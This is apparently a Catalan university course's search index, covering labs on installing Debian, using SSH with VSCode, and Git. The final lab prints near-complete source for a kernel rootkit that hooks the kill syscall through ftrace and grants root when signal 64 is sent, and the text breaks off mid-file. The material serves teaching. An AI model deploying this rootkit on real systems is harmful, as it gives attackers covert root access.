partici√≥ especial que s‚Äôutilitza com a mem√≤ria virtual quan la mem√≤ria RAM s‚Äôomple. Aquesta partici√≥ permet alliberar mem√≤ria RAM i evitar que el sistema es bloquegi.\n\n\n\nEscriu els canvis al disc.\n\n\nEspera que s‚Äôinstal¬∑li el sistema.\n\nConfigura el gestor de paquets.\n\nAnalitzar els discos de la instal¬∑laci√≥. Aquest pas permet seleccionar els discos on es troben els paquets d‚Äôinstal¬∑laci√≥. Normalment, aquest pas no cal modificar-lo.\n\n\n\nConfigura el gestor de paquets. En aquest cas, seleccionarem el servidor de paquets m√©s proper a la nostra ubicaci√≥.\n\nFiltrar els servidors de paquets per ubicaci√≥. \nSeleccionar el servidor de paquets. \n\n\nüëÄ Nota:\nA vegades, els servidors de paquets poden estar saturats o no funcionar correctament. En aquest cas, podeu seleccionar un servidor alternatiu o provar m√©s tard.\n\nConfigura el proxy. Si esteu darrere d‚Äôun proxy, podeu configurar-lo en aquest pas.\n\n\n‚ÑπÔ∏è Qu√® √©s un proxy?\nUn proxy √©s un servidor intermediari entre el vostre sistema i Internet. Aquest servidor pot ser utilitzat per controlar l‚Äôacc√©s a Internet, per protegir la vostra privacitat o per accelerar la connexi√≥ a Internet. Les peticions de connexi√≥ a Internet es fan a trav√©s del servidor proxy, que actua com a intermediari i reenvia les peticions al servidor de destinaci√≥. Per exemple, en una empresa, el proxy pot ser utilitzat per controlar l‚Äôacc√©s a Internet dels empleats i protegir la xarxa interna de possibles amenaces.\n\n\nEspera que s‚Äôinstal¬∑lin els paquets.\n\nConfigura el paquet popularity-contest.\n\nAquest paquet permet enviar informaci√≥ an√≤nima sobre els paquets instal¬∑lats al servidor de Debian per millorar la selecci√≥ de paquets i la qualitat dels paquets. Podeu seleccionar si voleu participar en aquest programa o no.\n\n\nSelecci√≥ de programari. En aquest punt podeu seleccionar si voleu un servidor en mode text o amb interf√≠cie gr√†fica. Tamb√© us permet seleccionar si voleu instal¬∑lar els serveis web i ssh al servidor i finalment si voleu les utilitats est√†ndard del sistema. Seleccionarem el servidor en mode text, el servei SSH activat i les utilitats est√†ndard del sistema.\n\n\n‚ÑπÔ∏è Qu√® √©s un servidor en mode text?\nUn servidor en mode text √©s un servidor que no t√© una interf√≠cie gr√†fica. Aix√≤ significa que tota la interacci√≥ amb el servidor es fa a trav√©s de la l√≠nia de comandes. Aquest tipus de servidor √©s molt com√∫ en entorns de producci√≥, ja que consumeix menys recursos i √©s m√©s segur que un servidor amb interf√≠cie gr√†fica.\n\n\n\n‚ÑπÔ∏è Qu√® √©s el servei SSH?\nEl servei SSH (Secure Shell) √©s un protocol de xifratament que permet connectar-se de forma segura a un servidor remot. Aquest servei √©s molt utilitzat per administrar servidors a dist√†ncia, ja que permet accedir al servidor de forma segura i xifratada.\n\nEspera que s‚Äôinstal¬∑li el programari.\n\nInstal¬∑la el gestor d‚Äôarrancada GRUB. \nInstal¬∑laci√≥ acabada. Un cop finalitzada la instal¬∑laci√≥, el sistema es reiniciar√† i podreu accedir al GRUB per seleccionar el sistema operatiu. \nEl GRUB us permet accedir al sistema operatiu. En aquest cas, seleccionarem Debian GNU/Linux. La resta d‚Äôopcions les veurem m√©s endavant en el curs.\n\n\n‚ÑπÔ∏è Qu√® √©s el GRUB?\nEl GRUB √©s un gestor d‚Äôarrencada que permet seleccionar el sistema operatiu que volem iniciar. Aquest gestor √©s molt √∫til en sistemes amb m√∫ltiples sistemes operatius o m√∫ltiples versions del mateix sistema operatiu.\n\nInicieu sessi√≥ amb l‚Äôusuari i la contrasenya que heu configurat durant la instal¬∑laci√≥.\n\n\n\n\n\n\n\nAlerta\n\n\n\nQuan escriviu la contrasenya, no es mostrar√† cap car√†cter a la pantalla. Aix√≤ √©s normal en sistemes Unix/Linux per motius de seguretat. Simplement escriviu la contrasenya i premeu Enter.\n\n\nTanqueu la sessi√≥ amb la comanda exit.\nInicieu sessi√≥ amb l‚Äôusuari root i la contrasenya que heu configurat durant la instal¬∑laci√≥.",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori 1 ¬∑ Instal¬∑laci√≥ i configuraci√≥ d'un entorn Linux"
    ]
  },
  {
    "objectID": "labs/01-introduction/lab01.html#exercicis-adicionals",
    "href": "labs/01-introduction/lab01.html#exercicis-adicionals",
    "title": "Laboratori 1: Instal¬∑laci√≥ de Debian 12",
    "section": "Exercicis adicionals",
    "text": "Exercicis adicionals\n\nInstal¬∑leu altres m√†quines virtuals amb altres sistemes operatius en mode gr√†fic com:\n\nUbuntu 24.04 LTS\nFedora 39",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori 1 ¬∑ Instal¬∑laci√≥ i configuraci√≥ d'un entorn Linux"
    ]
  },
  {
    "objectID": "labs/01-lab-introduction.html#esquema-sense-virtualitzaci√≥",
    "href": "labs/01-lab-introduction.html#esquema-sense-virtualitzaci√≥",
    "title": "Laboratori: Virtualitzaci√≥ i Control de Versions",
    "section": "Esquema sense virtualitzaci√≥",
    "text": "Esquema sense virtualitzaci√≥",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori ¬∑ Virtualitzaci√≥ i Control de Versions"
    ]
  },
  {
    "objectID": "labs/01-lab-introduction.html#esquema-amb-virtualitzaci√≥",
    "href": "labs/01-lab-introduction.html#esquema-amb-virtualitzaci√≥",
    "title": "Laboratori: Virtualitzaci√≥ i Control de Versions",
    "section": "Esquema amb virtualitzaci√≥",
    "text": "Esquema amb virtualitzaci√≥",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori ¬∑ Virtualitzaci√≥ i Control de Versions"
    ]
  },
  {
    "objectID": "labs/01-lab-introduction.html#laboratori-1-objectiu",
    "href": "labs/01-lab-introduction.html#laboratori-1-objectiu",
    "title": "Laboratori: Virtualitzaci√≥ i Control de Versions",
    "section": "Laboratori 1: Objectiu",
    "text": "Laboratori 1: Objectiu\n\nUna m√†quina virtual amb Debian 12 comparint recursos amb el vostre ordinador f√≠sic.",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori ¬∑ Virtualitzaci√≥ i Control de Versions"
    ]
  },
  {
    "objectID": "labs/01-lab-introduction.html#laboratori-1-tasques",
    "href": "labs/01-lab-introduction.html#laboratori-1-tasques",
    "title": "Laboratori: Virtualitzaci√≥ i Control de Versions",
    "section": "Laboratori 1: Tasques",
    "text": "Laboratori 1: Tasques\n\nInstal¬∑lar un hypervisor: VMWare Workstation Pro o VMWare Fusion.\nDesplegar una m√†quina virtual amb Linux dins de l‚Äôhypervisor.\n\n\nüìÑ Laboratori 1: Instal¬∑laci√≥ de Debian 12",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori ¬∑ Virtualitzaci√≥ i Control de Versions"
    ]
  },
  {
    "objectID": "labs/01-lab-introduction.html#laboratori-2-objectiu",
    "href": "labs/01-lab-introduction.html#laboratori-2-objectiu",
    "title": "Laboratori: Virtualitzaci√≥ i Control de Versions",
    "section": "Laboratori 2: Objectiu",
    "text": "Laboratori 2: Objectiu\n\nConnectar VSCode que s‚Äôexecuta a la m√†quina real per executar i comunicar-se amb la m√†quina virtual via SSH.",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori ¬∑ Virtualitzaci√≥ i Control de Versions"
    ]
  },
  {
    "objectID": "labs/01-lab-introduction.html#laboratori-2-tasques",
    "href": "labs/01-lab-introduction.html#laboratori-2-tasques",
    "title": "Laboratori: Virtualitzaci√≥ i Control de Versions",
    "section": "Laboratori 2: Tasques",
    "text": "Laboratori 2: Tasques\n\nConfigurar VSCode per connectar-se a la m√†quina virtual via SSH.\nProvar la connexi√≥ i executar ordres a la m√†quina virtual des de VSCode\n\n\nüìÑ Laboratori 2: Configurant el meu entorn de desenvolupament amb VSCode",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori ¬∑ Virtualitzaci√≥ i Control de Versions"
    ]
  },
  {
    "objectID": "labs/01-lab-introduction.html#laboratori-3-objectiu",
    "href": "labs/01-lab-introduction.html#laboratori-3-objectiu",
    "title": "Laboratori: Virtualitzaci√≥ i Control de Versions",
    "section": "Laboratori 3: Objectiu",
    "text": "Laboratori 3: Objectiu\n\n\nüìÑ Laboratori 3: Hola m√≥n en C a Debian",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori ¬∑ Virtualitzaci√≥ i Control de Versions"
    ]
  },
  {
    "objectID": "labs/01-lab-introduction.html#el-problema-de-les-versions",
    "href": "labs/01-lab-introduction.html#el-problema-de-les-versions",
    "title": "Laboratori: Virtualitzaci√≥ i Control de Versions",
    "section": "El problema de les versions üíæ",
    "text": "El problema de les versions üíæ\nQuantes vegades us ha passat que heu perdut un document o heu treballat sobre una versi√≥ antiga?\n\n\nprojecte_final.docx\nprojecte_final_v1.docx\nprojecte_final_definitiu.docx\n\n\n\n√âs dif√≠cil saber quin √©s l‚Äôarxiu correcte, quins canvis s‚Äôhi han fet i per qu√®. I si vull recuperar parts d‚Äôuna versi√≥ anterior?",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori ¬∑ Virtualitzaci√≥ i Control de Versions"
    ]
  },
  {
    "objectID": "labs/01-lab-introduction.html#la-soluci√≥-control-de-versions",
    "href": "labs/01-lab-introduction.html#la-soluci√≥-control-de-versions",
    "title": "Laboratori: Virtualitzaci√≥ i Control de Versions",
    "section": "La soluci√≥: Control de Versions",
    "text": "La soluci√≥: Control de Versions\nImagina‚Äôt que cada vegada que fas un canvi important en el teu document:\n\nGuardes una foto del document en aquell moment, amb una descripci√≥ dels canvis que has fet.\nAconsegueixes tenir un historial de totes les versions del document.\n\n\nSeria com tenir una m√†quina del temps per als teus documents!",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori ¬∑ Virtualitzaci√≥ i Control de Versions"
    ]
  },
  {
    "objectID": "labs/01-lab-introduction.html#control-de-versions-amb-git",
    "href": "labs/01-lab-introduction.html#control-de-versions-amb-git",
    "title": "Laboratori: Virtualitzaci√≥ i Control de Versions",
    "section": "Control de Versions amb Git üï∞Ô∏è",
    "text": "Control de Versions amb Git üï∞Ô∏è",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori ¬∑ Virtualitzaci√≥ i Control de Versions"
    ]
  },
  {
    "objectID": "labs/01-lab-introduction.html#el-t√∫nel-del-temps-de-git",
    "href": "labs/01-lab-introduction.html#el-t√∫nel-del-temps-de-git",
    "title": "Laboratori: Virtualitzaci√≥ i Control de Versions",
    "section": "El t√∫nel del temps de Git ‚è≥",
    "text": "El t√∫nel del temps de Git ‚è≥",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori ¬∑ Virtualitzaci√≥ i Control de Versions"
    ]
  },
  {
    "objectID": "labs/01-lab-introduction.html#el-multivers-de-git",
    "href": "labs/01-lab-introduction.html#el-multivers-de-git",
    "title": "Laboratori: Virtualitzaci√≥ i Control de Versions",
    "section": "El multivers de Git üåå",
    "text": "El multivers de Git üåå",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori ¬∑ Virtualitzaci√≥ i Control de Versions"
    ]
  },
  {
    "objectID": "labs/01-lab-introduction.html#laboratori-4-objectiu",
    "href": "labs/01-lab-introduction.html#laboratori-4-objectiu",
    "title": "Laboratori: Virtualitzaci√≥ i Control de Versions",
    "section": "Laboratori 4: Objectiu",
    "text": "Laboratori 4: Objectiu\n\nInstal¬∑lar i configurar el vostre entorn de desenvolupament (IDE) per connectar-vos a la m√†quina virtual mitjan√ßant SSH i utilitzar Git per al control de versions dels vostres projectes.\nReplicarem l‚Äôexemple de les diapositives utilitzant Visual Studio Code (VSCode) i Git.\n\n\nüìÑ Laboratori 4: Git",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori ¬∑ Virtualitzaci√≥ i Control de Versions"
    ]
  },
  {
    "objectID": "labs/01-lab-introduction.html#collaboraci√≥-en-equip",
    "href": "labs/01-lab-introduction.html#collaboraci√≥-en-equip",
    "title": "Laboratori: Virtualitzaci√≥ i Control de Versions",
    "section": "Col¬∑laboraci√≥ en equip ü§ù",
    "text": "Col¬∑laboraci√≥ en equip ü§ù\nEn la vostra vida professional, √©s molt probable que treballeu en equips on diverses persones col¬∑laboren en els mateixos projectes. Necessitareu que tots els membres de l‚Äôequip puguin sincronitzar els seus controls de versions i compartir els canvis de manera eficient.\n\nSeria com quan feu fotos amb el vostre m√≤bil i es guarden autom√†ticament al n√∫vol i les podeu veure en qualsevol moment i des de qualsevol dispositiu i les podeu compartir f√†cilment.",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori ¬∑ Virtualitzaci√≥ i Control de Versions"
    ]
  },
  {
    "objectID": "labs/01-lab-introduction.html#control-de-versions-amb-github",
    "href": "labs/01-lab-introduction.html#control-de-versions-amb-github",
    "title": "Laboratori: Virtualitzaci√≥ i Control de Versions",
    "section": "Control de Versions amb GitHub üêô",
    "text": "Control de Versions amb GitHub üêô\nGitHub √©s una plataforma en l√≠nia que facilita aquesta col¬∑laboraci√≥, us permet mantenir una c√≤pia als seus servidors i compartir els vostres projectes amb altres persones o tenir una c√≤pia de seguretat al n√∫vol per si perdeu la vostra c√≤pia local.",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori ¬∑ Virtualitzaci√≥ i Control de Versions"
    ]
  },
  {
    "objectID": "labs/01-lab-introduction.html#esquema-de-collaboraci√≥-amb-github",
    "href": "labs/01-lab-introduction.html#esquema-de-collaboraci√≥-amb-github",
    "title": "Laboratori: Virtualitzaci√≥ i Control de Versions",
    "section": "Esquema de col¬∑laboraci√≥ amb GitHub",
    "text": "Esquema de col¬∑laboraci√≥ amb GitHub",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori ¬∑ Virtualitzaci√≥ i Control de Versions"
    ]
  },
  {
    "objectID": "labs/01-lab-introduction.html#laboratori-5-objectiu",
    "href": "labs/01-lab-introduction.html#laboratori-5-objectiu",
    "title": "Laboratori: Virtualitzaci√≥ i Control de Versions",
    "section": "Laboratori 5: Objectiu",
    "text": "Laboratori 5: Objectiu\n\nCrear una calculadora col¬∑laborativa utilitzant Git i GitHub.\nAprendre a treballar amb branques i fer merge de canvis.\nPracticar la resoluci√≥ de conflictes en un entorn de col¬∑laboraci√≥.\n\n\nüìÑ Laboratori 5: Calculadora col¬∑laborativa",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori ¬∑ Virtualitzaci√≥ i Control de Versions"
    ]
  },
  {
    "objectID": "labs/04-kernel/lab02.html",
    "href": "labs/04-kernel/lab02.html",
    "title": "Laboratori 10: Escalada de privilegis",
    "section": "",
    "text": "M√†quina virtual amb Debian.\nRealitzar una snapshot de la m√†quina virtual abans de comen√ßar el laboratori.\nProgramari necessari:\n\nEines de construcci√≥ de programari: build-essential\nCap√ßaleres del kernel: linux-headers-$(uname -r)\nAltres eines: libncurses-dev, bison, flex, kmod\nInstal¬∑laci√≥ de les eines necess√†ries:\nsu -c \"apt update && apt upgrade -y\"\nsu -c \"apt install build-essential linux-headers-$(uname -r) libncurses-dev bison flex kmod -y\"",
    "crumbs": [
      "Laboratoris",
      "Unitat 02",
      "Laboratori 10 ¬∑ Escalada de privilegis"
    ]
  },
  {
    "objectID": "labs/04-kernel/lab02.html#requeriments-previs",
    "href": "labs/04-kernel/lab02.html#requeriments-previs",
    "title": "Laboratori 10: Escalada de privilegis",
    "section": "",
    "text": "M√†quina virtual amb Debian.\nRealitzar una snapshot de la m√†quina virtual abans de comen√ßar el laboratori.\nProgramari necessari:\n\nEines de construcci√≥ de programari: build-essential\nCap√ßaleres del kernel: linux-headers-$(uname -r)\nAltres eines: libncurses-dev, bison, flex, kmod\nInstal¬∑laci√≥ de les eines necess√†ries:\nsu -c \"apt update && apt upgrade -y\"\nsu -c \"apt install build-essential linux-headers-$(uname -r) libncurses-dev bison flex kmod -y\"",
    "crumbs": [
      "Laboratoris",
      "Unitat 02",
      "Laboratori 10 ¬∑ Escalada de privilegis"
    ]
  },
  {
    "objectID": "labs/04-kernel/lab02.html#objectiu",
    "href": "labs/04-kernel/lab02.html#objectiu",
    "title": "Laboratori 10: Escalada de privilegis",
    "section": "Objectiu",
    "text": "Objectiu\nL‚Äôobjectiu d‚Äôaquest laboratori √©s crear un rootkit que intercepti una crida a sistema espec√≠fica (sys_kill) i permeti una escalada de privilegis. Aix√≤ es fa mitjan√ßant la implementaci√≥ d‚Äôuna funci√≥ hook que canvia el comportament de la crida kill quan s‚Äôutilitza amb un cert senyal (utilitzarem l‚Äôenter 64 ja que √©s un enter lliure i no es fa servir per cap senyal), permetent l‚Äôescalada de privilegis. Aquest exemple s‚Äôha extret de (TheXcellerator).",
    "crumbs": [
      "Laboratoris",
      "Unitat 02",
      "Laboratori 10 ¬∑ Escalada de privilegis"
    ]
  },
  {
    "objectID": "labs/04-kernel/lab02.html#procediment",
    "href": "labs/04-kernel/lab02.html#procediment",
    "title": "Laboratori 10: Escalada de privilegis",
    "section": "Procediment",
    "text": "Procediment\n\n\n\nEsquema del procediment\n\n\n\nCrida a sistema en mode usuari: Les crides a sistema s√≥n operacions cr√≠tiques que es fan des del mode usuari. La instrucci√≥ SYSCALL permet invocar una crida a sistema que ser√† gestionada pel nucli.\nGestor espec√≠fic pren el control: Quan es realitza una crida a sistema des de l‚Äôespai d‚Äôusuari, el nucli del sistema operatiu pren el control. Aquest es delega a una funci√≥ de baix nivell implementada, com ara do_syscall_64(). Aquesta funci√≥ accedeix a la taula de controladors de crides al sistema (sys_call_table) i crida un controlador espec√≠fic basat en el n√∫mero de crida a sistema.\n**Ftrace i __fentry()**: Al principi de cada funci√≥ dins del nucli, s‚Äôubica una crida especial *__fentry()*, que fa part del sistema de tra√ßabilitat Ftrace. Si aquesta funci√≥ no ha de ser tra√ßada, se substitueix amb una instrucci√≥ nop.\nFtrace crida al nostre callback: Quan s‚Äôexecuta una crida a sistema tra√ßada per Ftrace, el sistema crida al nostre callback espec√≠fic que hem enganxat (hooked). En aquest callback, podem modificar el valor del registre ip, que apunta a la seg√ºent funci√≥ que ha d‚Äôexecutar-se.\nRestauraci√≥ de l‚Äôestat dels registres: Ftrace es responsabilitza de restaurar l‚Äôestat original dels registres abans de passar el control al controlador original de la crida a sistema. El nostre hook canvia el registre ip per dirigir l‚Äôexecuci√≥ a la nostra funci√≥ hook, no a la funci√≥ original.\nCanvi de control a la nostra funci√≥ hook: Aquest canvi de registre ip dirigeix l‚Äôexecuci√≥ a la nostra funci√≥ hook, per√≤ el processador i la mem√≤ria romanen en el mateix estat. La nostra funci√≥ hook rep els arguments del controlador original.\nExecuci√≥ de la funci√≥ original: La funci√≥ hook crida la funci√≥ original de la crida a sistema, obtenint aix√≠ el control de la crida a sistema.\nProcessament del hook: Despr√©s d‚Äôanalitzar el context i els arguments de la crida al sistema, el nostre hook realitza les accions desitjades.\nCallback sense accions: En la segona crida a la funci√≥ original de la crida a sistema, que passa a trav√©s de Ftrace, el callback no fa cap acci√≥, permetent que la funci√≥ original s‚Äôexecuti sense interrupcions.\nTornada a la funci√≥ original: La funci√≥ original de la crida a sistema s‚Äôexecuta sense interfer√®ncies, ja que ha estat cridada no pel nucli des de do_syscall_64(), sin√≥ per la nostra funci√≥ hook.\nRetorn al gestor de crides del sistema: Despr√©s que la funci√≥ original ha acabat, el control retorna al gestor de crides del sistema (sys_xxxx()), i de nou a la nostra funci√≥ hook (fh_sys_execve()).\nRetorn al mode d‚Äôusuari: Finalment, el nucli passa el control al proc√©s de l‚Äôusuari, completant el cicle d‚Äôexecuci√≥ d‚Äôuna crida a sistema amb l‚Äô√∫s d‚Äôun hook.",
    "crumbs": [
      "Laboratoris",
      "Unitat 02",
      "Laboratori 10 ¬∑ Escalada de privilegis"
    ]
  },
  {
    "objectID": "labs/04-kernel/lab02.html#implementaci√≥",
    "href": "labs/04-kernel/lab02.html#implementaci√≥",
    "title": "Laboratori 10: Escalada de privilegis",
    "section": "Implementaci√≥",
    "text": "Implementaci√≥\nL‚Äôimplementaci√≥ es basa en modificar la funci√≥ de crida a sistema kill per interceptar la crida amb un senyal espec√≠fic (64 en aquest cas) i, si es detecta aquest senyal, canviar les credencials de l‚Äôusuari actual a les credencials d‚Äôadministrador (root), permetent aix√≠ l‚Äôescalada de privilegis.\n\nCrearem una funci√≥ que modifiqui les credencials de l‚Äôusuari actual per les credencials d‚Äôadministrador (root). Aquesta funci√≥ utilitza la structura cred per modificar les credencials de l‚Äôusuari. Aquesta estructura es troba a include/linux/cred.h. prepare_creds() crea una nova estructura de credencials i l‚Äôassigna a la variable root. Per representar l‚Äôusuari root necessitem editar els valors uid,gid,egid,sgid,fsgid al valors 0 que en sistemes linux es reserva per l‚Äôusuari root. Finalment, commit_creds() aplica les credencials a l‚Äôusuari actual.\nvoid set_root(void)\n{\n    struct cred *root;\n    root = prepare_creds();\n    if (root == NULL)\n        return;\n    root-&gt;uid.val = \n        root-&gt;gid.val = 0;\n    root-&gt;euid.val = \n        root-&gt;egid.val = 0;\n    root-&gt;suid.val = \n        root-&gt;sgid.val = 0;\n    root-&gt;fsuid.val = \n        root-&gt;fsgid.val = 0;\n    commit_creds(root);\n}\nUn cop implementada la funci√≥ per esdevenir root, necessitem implementar un hook (rutina de tractament de la senyal 64). En aquest cas, el nostre hook interceptar√† la crida a sistema kill i, si el senyal √©s 64, cridar√† a la funci√≥ set_root() per esdevenir root. Per obtenir el n¬∫ de senyal utilitzarem la variable si de la structura pt_regs. Aquesta estructura cont√© informaci√≥ sobre els registres del processador en el moment de la crida a sistema i ens permet obtenir informaci√≥ com el n¬∫ de senyal, el PID, etc.\nasmlinkage int hook_kill(\n    const struct pt_regs *regs)\n{\n    void set_root(void);\n    int sig = regs-&gt;si;\n    if (sig == 64)\n    {\n        printk(KERN_INFO \"rootkit: giving root...\\n\");\n        set_root();\n        return 0;\n    }\n    return orig_kill(regs);\n}\nImplementarem un m√≤dul del kernel que utiltizi aquestes funcions i ens permeti instal¬∑lar/desintal¬∑lar el nostre rootkit al sistema.\n    #include &lt;linux/init.h&gt;\n    #include &lt;linux/module.h&gt;\n    #include &lt;linux/kernel.h&gt;\n    #include &lt;linux/syscalls.h&gt;\n    #include &lt;linux/kallsyms.h&gt;\n    #include &lt;linux/version.h&gt;\n\n    #include \"ftrace_helper.h\"\n\n    MODULE_LICENSE(\"GPL\");\n    MODULE_AUTHOR(\"Jordi Mateo\");\n    MODULE_DESCRIPTION(\"\");\n    MODULE_VERSION(\"0.01\");\n\n    /* After Kernel 4.17.0, the way that syscalls are handled changed\n    * to use the pt_regs struct instead of the more familiar function\n    * prototype declaration. We have to check for this, and set a\n    * variable for later on */\n    #if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE &gt;= KERNEL_VERSION(4,17,0))\n    #define PTREGS_SYSCALL_STUBS 1\n    #endif\n\n    /* We now have to check for the PTREGS_SYSCALL_STUBS flag and\n    * declare the orig_kill and hook_kill functions differently\n    * depending on the kernel version. This is the largest barrier to \n    * getting the rootkit to work on earlier kernel versions. The\n    * more modern way is to use the pt_regs struct. */\n    #ifdef PTREGS_SYSCALL_STUBS\n    static asmlinkage long (*orig_kill)(const struct pt_regs *);\n\n    /* We can only modify our own privileges, and not that of another\n    * process. Just have to wait for signal 64 (normally unused) \n    * and then call the set_root() function. */\n    asmlinkage int hook_kill(const struct pt_regs *regs)\n    {\n        void set_root(void);\n\n        // pid_t pid = regs-&gt;di;\n        int sig = regs-&gt;si;\n\n        if ( sig == 64 )\n        {\n            printk(KERN_INFO \"rootkit: giving root...\\n\");\n            set_root();\n            return 0;\n        }\n\n        return orig_kill(regs);\n\n    }\n    #else\n    /* This is the old way of declaring a syscall hook */\n\n    static asmlinkage long (*orig_kill)(pid_t pid, int sig);\n\n    static asmlinkage int hook_kill(pid_t pid, int sig)\n    {\n        void set_root(void);\n\n        if ( sig == 64 )\n        {\n            printk(KERN_INFO \"rootkit: giving root...\\n\");\n            set_root();\n            return 0;\n        }\n\n        return orig_kill(pid, sig);\n    }\n    #endif\n\n    /* Whatever calls this function will have it's creds struct replaced\n    * with root's */\n    void set_root(void)\n    {\n        /* prepare_creds returns the current credentials of the process */\n        struct cred *root;\n        root = prepare_creds();\n\n        if (root == NULL)\n            return;\n\n        /* Run through and set all the various *id's to 0 (root) */\n        root-&gt;uid.val = root-&gt;gid.val = 0;\n        root-&gt;euid.val = root-&gt;egid.val = 0;\n        root-&gt;suid.val = root-&gt;sgid.val = 0;\n        root-&gt;fsuid.val = root-&gt;fsgid.val = 0;\n\n        /* Set the cred struct that we've modified to that of the calling process */\n        commit_creds(root);\n    }\n\n    /* Declare the struct that ftrace needs to hook the syscall */\n    static struct ftrace_hook hooks[] = {\n        HOOK(\"__x64_sys_kill\", hook_kill, &orig_kill),\n    };\n\n    /* Module initialization function */\n    static int __init rootkit_init(void)\n    {\n        /* Hook the syscall and print to the kernel buffer */\n        int err;\n        err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));\n        if(err)\n            return err;\n\n        printk(KERN_INFO \"rootkit: Loaded &gt;:-)\\n\");\n\n        return 0;\n    }\n\n    static void __exit rootkit_exit(void)\n    {\n        /* Unhook and restore the syscall and print to the kernel buffer */\n        fh_remove_hooks(hooks, ARRAY_SIZE(hooks));\n        printk(KERN_INFO \"rootkit: Unloaded :-(\\n\");\n    }\n\n    module_init(rootkit_init);\n    module_exit(rootkit_exit);\nFinalment implementar el fitxer ftrace_helper.h que cont√© les funcions auxiliars per a la implementaci√≥ del rootkit. La macro HOOK obtindr√† l‚Äôadre√ßa original on tenim implementada la funcionalitat real de la crida a sistema i la modificar√† (hook) per tenir en aquella adre√ßa la nostra funcionalitat maliciosa.\n    /*\n    * Helper library for ftrace hooking kernel functions\n    * Author: Harvey Phillips (xcellerator@gmx.com)\n    * License: GPL\n    * */\n\n    #include &lt;linux/ftrace.h&gt;\n    #include &lt;linux/linkage.h&gt;\n    #include &lt;linux/slab.h&gt;\n    #include &lt;linux/uaccess.h&gt;\n    #include &lt;linux/version.h&gt;\n\n    #if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE &gt;= KERNEL_VERSION(4,17,0))\n    #define PTREGS_SYSCALL_STUBS 1\n    #endif\n\n    /*\n    * On Linux kernels 5.7+, kallsyms_lookup_name() is no longer exported, \n    * so we have to use kprobes to get the address.\n    * Full credit to @f0lg0 for the idea.\n    */\n    #if LINUX_VERSION_CODE &gt;= KERNEL_VERSION(5,7,0)\n    #define KPROBE_LOOKUP 1\n    #include &lt;linux/kprobes.h&gt;\n    static struct kprobe kp = {\n        .symbol_name = \"kallsyms_lookup_name\"\n    };\n    #endif\n\n    #define HOOK(_name, _hook, _orig)   \\\n    {                   \\\n        .name = (_name),        \\\n        .function = (_hook),        \\\n        .original = (_orig),        \\\n    }\n\n    /* We need to prevent recursive loops when hooking, otherwise the kernel will\n    * panic and hang. The options are to either detect recursion by looking at\n    * the function return address, or by jumping over the ftrace call. We use the \n    * first option, by setting USE_FENTRY_OFFSET = 0, but could use the other by\n    * setting it to 1. (Oridinarily ftrace provides it's own protections against\n    * recursion, but it relies on saving return registers in $rip. We will likely\n    * need the use of the $rip register in our hook, so we have to disable this\n    * protection and implement our own).\n    * */\n    #define USE_FENTRY_OFFSET 0\n    #if !USE_FENTRY_OFFSET\n    #pragma GCC optimize(\"-fno-optimize-sibling-calls\")\n    #endif\n\n    /* We pack all the information we need (name, hooking function, original function)\n    * into this struct. This makes is easier for setting up the hook and just passing\n    * the entire struct off to fh_install_hook() later on.\n    * */\n    struct ftrace_hook {\n        const char *name;\n        void *function;\n        void *original;\n\n        unsigned long address;\n        struct ftrace_ops ops;\n    };\n\n    /* Ftrace needs to know the address of the original function that we\n    * are going to hook. As before, we just use kallsyms_lookup_name() \n    * to find the address in kernel memory.\n    * */\n    static int fh_resolve_hook_address(struct ftrace_hook *hook)\n    {\n    #ifdef KPROBE_LOOKUP\n        typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);\n        kallsyms_lookup_name_t kallsyms_lookup_name;\n        register_kprobe(&kp);\n        kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;\n        unregister_kprobe(&kp);\n    #endif\n        hook-&gt;address = kallsyms_lookup_name(hook-&gt;name);\n\n        if (!hook-&gt;address)\n        {\n            printk(KERN_DEBUG \"rootkit: unresolved symbol: %s\\n\", hook-&gt;name);\n            return -ENOENT;\n        }\n\n    #if USE_FENTRY_OFFSET\n        *((unsigned long*) hook-&gt;original) = hook-&gt;address + MCOUNT_INSN_SIZE;\n    #else\n        *((unsigned long*) hook-&gt;original) = hook-&gt;address;\n    #endif\n\n        return 0;\n    }\n\n    /* See comment below within fh_install_hook() */\n    static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct pt_regs *regs)\n    {\n        struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);\n\n    #if USE_FENTRY_OFFSET\n        regs-&gt;ip = (unsigned long) hook-&gt;function;\n    #else\n        if(!within_module(parent_ip, THIS_MODULE))\n            regs-&gt;ip = (unsigned long) hook-&gt;function;\n    #endif\n    }\n\n    /* Assuming we've already set hook-&gt;name, hook-&gt;function and hook-&gt;original, we \n    * can go ahead and install the hook with ftrace. This is done by setting the \n    * ops field of hook (see the comment below for more details), and then using\n    * the built-in ftrace_set_filter_ip() and register_ftrace_function() functions\n    * provided by ftrace.h\n    * */\n    int fh_install_hook(struct ftrace_hook *hook)\n    {\n        int err;\n        err = fh_resolve_hook_address(hook);\n        if(err)\n            return err;\n\n        /* For many of function hooks (especially non-trivial ones), the $rip\n        * register gets 